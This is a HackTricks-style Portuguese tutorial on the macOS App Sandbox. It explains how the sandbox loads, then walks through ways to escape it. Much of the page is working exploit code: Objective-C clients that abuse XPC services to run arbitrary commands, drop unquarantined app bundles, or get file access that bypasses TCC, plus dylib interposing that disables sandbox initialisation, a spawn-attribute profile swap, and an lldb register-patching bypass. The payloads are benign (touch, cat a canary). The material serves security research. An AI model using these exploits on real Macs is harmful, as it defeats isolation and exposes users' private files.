# Debug e bypass do macOS Sandbox

{{#include ../../../../../banners/hacktricks-training.md}}

## Processo de carregamento do Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Imagem de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

Na imagem anterior, é possível observar **como o sandbox será carregado** quando um aplicativo com o entitlement **`com.apple.security.app-sandbox`** é executado.

O compilador vincula `/usr/lib/libSystem.B.dylib` ao binário.

Em seguida, **`libSystem.B`** chama várias funções até que **`xpc_pipe_routine`** envie os entitlements do aplicativo para **`securityd`**. O Securityd verifica se o processo deve ser colocado em quarentena dentro do sandbox e, em caso afirmativo, coloca-o em quarentena.\
Por fim, o sandbox é ativado com uma chamada a **`__sandbox_ms`**, que chama **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Possíveis Bypasses

### Bypass do atributo de quarentena

**Arquivos criados por processos em sandbox** recebem o **atributo de quarentena** para impedir escapes do sandbox: se você soltar um novo aplicativo e tentar iniciá-lo, a flag de quarentena o impede. Portanto, **se conseguir soltar um arquivo ou uma pasta *sem* o atributo de quarentena, você pode escapar do App Sandbox** — basta soltar um bundle `.app` e iniciá-lo com `open`, já que o processo recém-iniciado é executado pelo LaunchServices, e não pelo seu sandbox.

A maneira confiável de criar um **arquivo sem quarentena** é pedir a **outro processo para criar o arquivo por você**. Conforme documentado em [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), de Mickey Jin, o **App Sandbox** marca os arquivos criados com quarentena, mas os **serviços XPC executados no Service Sandbox não fazem isso**. Portanto, vários serviços XPC sem autenticação poderiam ser usados como uma primitiva de "lavagem de quarentena":<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) e **CVE-2023-32414** (`ArchiveService`): extraem um arquivo passado por um app em sandbox para um local escolhido **sem propagar o xattr de quarentena ao conteúdo extraído**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): uma path traversal em `submitSignpostDataWithConfig:` permitia criar **diretórios arbitrários sem quarentena**, o que basta para montar toda a estrutura de um bundle `.app` fora do container.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): monta uma DMG em quarentena **sem colocar o dispositivo resultante em quarentena**, permitindo iniciar os aplicativos no volume montado.

> [!TIP]
> A extração geralmente **remove o bit de permissão de execução**. A solução alternativa usada na CVE-2023-27944 foi colocar um **symlink** para um binário de sistema assinado já existente (por exemplo, `/System/Library/CoreServices/Automator Application Stub`) como executável principal do bundle, permitindo iniciá-lo sem precisar de `+x` em um arquivo criado.

> [!CAUTION]
> Isso funciona porque a verificação é determinada pela **flag do item que está sendo iniciado**: *"When an app or other executable code is run from the Finder or GUI, macOS checks its quarantine flag before loading it"*, e só então *"it's handed over to Gatekeeper for full 'first run' security checks"* ([Explainer: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Sem uma flag no bundle que você inicia, não há verificação do Gatekeeper — essa é exatamente a primitiva fornecida pelas CVEs acima.<sup>[[5]](#references)</sup>
>
> Observe que, se um bundle `.app` já tiver sido autorizado a executar (ele tem um xattr de quarentena com a flag "authorized to run"), você também poderia abusar dele... exceto que agora não é possível gravar dentro de bundles **`.app`** sem permissões TCC privilegiadas (que você não terá dentro de um sandbox).

### Abusar da funcionalidade Open

Nos [**últimos exemplos de bypass do sandbox do Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv), é possível ver como a funcionalidade de linha de comando **`open`** pode ser abusada para escapar do sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Mesmo que um aplicativo **deva estar em sandbox** (`com.apple.security.app-sandbox`), é possível escapar do sandbox se ele for **executado por um LaunchAgent** (`~/Library/LaunchAgents`), por exemplo.\
Conforme explicado [**nesta publicação**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), se você quiser obter persistência com um aplicativo em sandbox, pode configurá-lo para ser executado automaticamente como LaunchAgent e talvez injetar código malicioso por meio de variáveis de ambiente DyLib.<sup>[[6]](#references)</sup>

### Abusar de locais de início automático

Se um processo em sandbox puder **gravar** em um local onde **um aplicativo sem sandbox executará o binário mais tarde**, ele poderá **escapar simplesmente colocando** o binário nesse local. Bons exemplos desse tipo de local são `~/Library/LaunchAgents` ou `/System/Library/LaunchDaemons`.

Para isso, talvez sejam necessários **2 passos**: fazer com que um processo com um **sandbox mais permissivo** (`file-read*`, `file-write*`) execute seu código, que então gravará em um local onde será **executado sem sandbox**.

Confira esta página sobre **locais de início automático**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusar de outros processos

Se, a partir do processo em sandbox, você conseguir **comprometer outros processos** que estejam sendo executados em sandboxes menos restritivos (ou sem sandbox), poderá escapar para os respectivos sandboxes:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Serviços Mach de sistema e de usuário disponíveis

O sandbox também permite a comunicação com determinados **serviços Mach** via XPC, definidos no perfil `application.sb`. Se você conseguir **abusar** de um desses serviços, poderá **escapar do sandbox**.

Conforme indicado [neste write-up](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), as informações sobre os serviços Mach estão armazenadas em `/System/Library/xpc/launchd.plist`. É possível encontrar todos os serviços Mach de sistema e de usuário procurando por `<string>System</string>` e `<string>User</string>` nesse arquivo.<sup>[[4]](#references)</sup>

Além disso, é possível verificar se um serviço Mach está disponível para um aplicativo em sandbox chamando `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Mach services PID disponíveis

Esses serviços Mach foram abusados pela primeira vez para [escapar do sandbox neste writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). Naquela época, **todos os serviços XPC necessários** para um aplicativo e seu framework estavam visíveis no domínio PID do app (esses são serviços Mach com `ServiceType` definido como `Application`).<sup>[[4]](#references)</sup>

Para **entrar em contato com um serviço XPC de um domínio PID**, basta registrá-lo no app com uma linha como:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Além disso, é possível encontrar todos os serviços Mach **Application** pesquisando por `<string>Application</string>` em `System/Library/xpc/launchd.plist`.

Outra maneira de encontrar serviços xpc válidos é verificar os que estão em:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Vários exemplos de abuso dessa técnica podem ser encontrados no [**artigo original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/); no entanto, estes são alguns exemplos resumidos.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Esse serviço permite todas as conexões XPC, retornando sempre `YES`, e o método `runTask:arguments:withReply:` executa um comando arbitrário com parâmetros arbitrários.

O exploit era “tão simples quanto”:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Este serviço XPC permitia todos os clientes ao sempre retornar `YES`, e o método `createZipAtPath:hourThreshold:withReply:` aceitava o caminho de uma pasta e a compactava em um arquivo ZIP.

Assim, era possível gerar uma estrutura falsa de pasta de app, compactá-la e depois descompactá-la e executá-la para escapar do sandbox, pois os novos arquivos não teriam o atributo quarantine.

O exploit era:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Este serviço XPC permite conceder acesso de leitura e gravação a uma URL arbitrária ao cliente XPC por meio do método `extendAccessToURL:completion:`, que aceitava qualquer conexão. Como o serviço XPC tem FDA, é possível abusar dessas permissões para contornar completamente o TCC.

O exploit era:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Compilação estática e linking dinâmico

[**Esta pesquisa**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descobriu 2 maneiras de contornar o Sandbox. Como o sandbox é aplicado em userland quando a biblioteca **libSystem** é carregada, se um binário pudesse evitar carregá-la, nunca seria colocado em sandbox:<sup>[[2]](#references)</sup>

- Se o binário fosse **completamente compilado estaticamente**, poderia evitar carregar essa biblioteca.
- Se o **binário não precisasse carregar nenhuma biblioteca** (porque o linker também está em libSystem), não precisaria carregar libSystem.

### Shellcodes

Observe que **até mesmo shellcodes** em ARM64 precisam ser vinculados a `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Restrições não herdadas

Como explicado no **[bônus deste writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, uma restrição de sandbox como:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

pode ser contornado por um novo processo executando, por exemplo:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

No entanto, é claro que esse novo processo não herdará entitlements nem privilégios do processo pai.

### Substituindo um sandbox herdado com atributos de spawn (macOS mais antigo)

Um processo filho normal de `posix_spawn()` herda o sandbox do processo pai. Em compilações do macOS anteriores à correção de fevereiro de 2026, um processo pai em sandbox podia, em vez disso, passar um **nome de perfil integrado** à política MAC `Sandbox` por meio de `posix_spawnattr_setmacpolicyinfo_np()`. Assim, o processo filho recebia esse perfil *em vez das restrições* do processo pai. O perfil integrado `no-network` ainda permitia acesso ao diretório home do usuário, então um processo filho como `/bin/bash` podia acessar arquivos que o processo pai com App Sandbox não podia. Isso é diferente da [rota do LaunchServices `open`](#not-inherited-restrictions), em que um serviço separado inicia o processo. Consulte [Atributos de spawn específicos de políticas MACF](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) para conhecer o caminho geral de entrada.<sup>[[7]](#references)</sup>

Para testar esse limite em um **host macOS afetado e isolado**, crie um canary inofensivo no diretório home, fora do contêiner do app. Execute o mesmo processo filho a partir de um processo pai que já esteja em sandbox, primeiro com `posix_spawn()` comum e, em seguida, com um blob de atributo de spawn do Sandbox selecionando `no-network`; compare se o processo filho consegue ler o canary. O fragmento a seguir usa a definição privada de `sandbox_spawnattr_t` e as declarações de função do [launcher de exemplo](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) de Siguza. Adicione o tratamento de erros normal ao integrá-lo a um app de teste.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Um retorno bem-sucedido de `posix_spawn()` não prova que houve escape: verifique o **acesso efetivo a arquivos do processo filho** em comparação com o comportamento de referência de um processo filho comum. Sistemas corrigidos rejeitam um perfil integrado solicitado por um processo já em sandbox, a menos que ele tenha o entitlement privado `com.apple.private.security.sandbox-spawnattrs`. Não considere esse comportamento histórico um bypass atual.<sup>[[7]](#references)</sup>

### Entitlements

Observe que algumas **ações** podem ser **permitidas pelo sandbox** se um aplicativo tiver um **entitlement** específico, como em:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Para mais informações sobre **Interposting**, consulte:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` para impedir o sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interceptar `__mac_syscall` para evitar o Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Depurar e contornar o Sandbox com lldb

Vamos compilar um aplicativo que deveria estar em sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Em seguida, compile o app:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> O app tentará **ler** o arquivo **`~/Desktop/del.txt`**, o que o **Sandbox não permitirá**.\
> Crie um arquivo nesse local, pois, assim que o Sandbox for contornado, o app poderá lê-lo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Vamos depurar a aplicação para ver quando o Sandbox é carregado:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Mesmo com o Sandbox contornado, o TCC perguntará ao usuário se deseja permitir que o processo leia arquivos da Área de Trabalho**

## References

- [1] [Jonathan Levin - O Sandbox da Apple: Mais fundo no atoleiro (slides da HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Escape do Sandbox da Mac App Store](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - O Sandbox da Apple: Mais fundo no atoleiro (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Uma nova era de escapes do Sandbox do macOS](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explicação: Quarentena](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): Bypass de TCC do macOS com Telegram usando injeção de DyLib (Parte 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Escapando do Sandbox da Apple ao iniciar um executável](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec, mas para perfis integrados](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
